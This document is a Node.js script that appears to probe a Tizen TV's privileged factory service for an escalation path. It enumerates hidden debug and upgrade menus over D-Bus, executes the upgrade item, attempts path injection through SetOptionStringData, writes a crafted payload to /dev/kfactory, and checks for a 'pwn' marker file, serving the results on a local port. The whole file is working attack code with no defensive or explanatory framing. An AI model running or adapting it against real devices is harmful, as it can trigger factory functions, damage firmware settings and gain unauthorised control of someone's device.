'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8182;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe93h.txt';
var PWN = '/tmp/pwn93h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. GetChildItem(3, 0..31) - Debug menu, NO (1,) filter this time
  'r.debug_children = [];',
  'for (var i = 0; i < 32; i++) {',
  '  try {',
  '    var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","3",String(i)],{timeout:3000});',
  '    var out = (o.stdout||new Buffer(0)).toString().trim();',
  '    r.debug_children.push({ idx: i, data: out.slice(0,200) });',
  '  } catch(e) { r.debug_children.push({ idx: i, err: e.message.slice(0,40) }); }',
  '}',

  // 2. GetChildItem(5, 0..49) - Hidden menu first 50 items, NO filter
  'r.hidden_children = [];',
  'for (var k = 0; k < 50; k++) {',
  '  try {',
  '    var o3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","5",String(k)],{timeout:3000});',
  '    var out3 = (o3.stdout||new Buffer(0)).toString().trim();',
  '    r.hidden_children.push({ idx: k, data: out3.slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 3. GetChildItem(804, 0..25) - Upgrade sub-menu (26 children) - KEY TARGET
  'r.upgrade_children = [];',
  'for (var u = 0; u < 26; u++) {',
  '  try {',
  '    var o_u = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","804",String(u)],{timeout:3000});',
  '    var out_u = (o_u.stdout||new Buffer(0)).toString().trim();',
  '    r.upgrade_children.push({ idx: u, data: out_u.slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 4. GetChildItem(104, 0..15) - Self Test(for HW) sub-menu (32 children, first 16)
  'r.selftest_children = [];',
  'for (var s = 0; s < 16; s++) {',
  '  try {',
  '    var o_s = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","104",String(s)],{timeout:3000});',
  '    var out_s = (o_s.stdout||new Buffer(0)).toString().trim();',
  '    r.selftest_children.push({ idx: s, data: out_s.slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 5. GetItem directly by key number for Debug items (using formula: key=(idx+1)*100+3)
  'r.debug_items_by_key = {};',
  'var debug_keys = [103,203,303,403,503,603,703,803,903,1003,1103,1203,1303,1403,1503,1603];',
  'debug_keys.forEach(function(dk) {',
  '  try {',
  '    var o_dk = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(dk)],{timeout:3000});',
  '    var out_dk = (o_dk.stdout||new Buffer(0)).toString().trim();',
  '    r.debug_items_by_key["k"+dk] = out_dk.slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 6. Executes(804, 0) - What does executing "Upgrade" do?
  'try {',
  '  var o_e804 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","804","0"],{timeout:8000});',
  '  r.exec804_0 = (o_e804.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.exec804_0_err = e.message.slice(0,60); }',

  // 7. GetOptionStringData(7..20) - check for more writable string options
  'r.opt_strings_7_20 = {};',
  'for (var os = 7; os <= 20; os++) {',
  '  try {',
  '    var o_os = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData",String(os)],{timeout:3000});',
  '    var sout = (o_os.stdout||new Buffer(0)).toString().trim();',
  '    if (sout && sout !== "") r.opt_strings_7_20["k"+os] = sout.slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 8. SetOptionStringData on Upgrade key (804) with path injection attempt
  //    Current value unknown - try writing benign path first to test
  'try {',
  '  var o_su = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","804","/tmp","4"],{timeout:5000});',
  '  r.set_opt_804_tmp = (o_su.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_opt_804_tmp_err = e.message.slice(0,60); }',
  'try {',
  '  var o_gu = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","804"],{timeout:3000});',
  '  r.get_opt_804 = (o_gu.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',

  // 9. SaveLog(0) and SaveLog(1) - might write files via system()
  'try {',
  '  var o_sl = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SaveLog","0"],{timeout:8000});',
  '  r.savelog0 = (o_sl.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.savelog0_err = e.message.slice(0,60); }',
  // Check if SaveLog created any files in /tmp
  'try {',
  '  var tmp_files = fs.readdirSync("/tmp");',
  '  r.tmp_after_savelog = tmp_files.filter(function(f){ return f.indexOf("log")>-1||f.indexOf("check")>-1||f.indexOf("factory")>-1||f.indexOf("samsung")>-1||f.indexOf("kpi")>-1; });',
  '} catch(e) {}',

  // 10. kfactory write with cmd=0x64 (100=decimal) - SVC category offset
  // SVC children start at key 104 = 0x68. Try cmd bytes that might match SVC categories
  'var payload2 = new Buffer(40);',
  'payload2.fill(0);',
  'payload2.writeUInt32LE(0x01, 0);',  // type=exec
  'payload2.writeUInt32LE(104, 4);',   // id=104 (Self Test)
  'payload2.writeUInt32LE(0, 8);',
  'try {',
  '  var kfd2 = fs.openSync("/dev/kfactory", "w");',
  '  var kn2 = fs.writeSync(kfd2, payload2, 0, 40);',
  '  fs.closeSync(kfd2);',
  '  r.kfac_selftest_write = { written: kn2 };',
  '} catch(e) { r.kfac_selftest_write_err = e.message.slice(0,60); }',

  // 11. dmesg last 30 lines
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_tail = dm.slice(-30).join("\\n").slice(0,2000);',
  '} catch(e) {}',

  // 12. pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
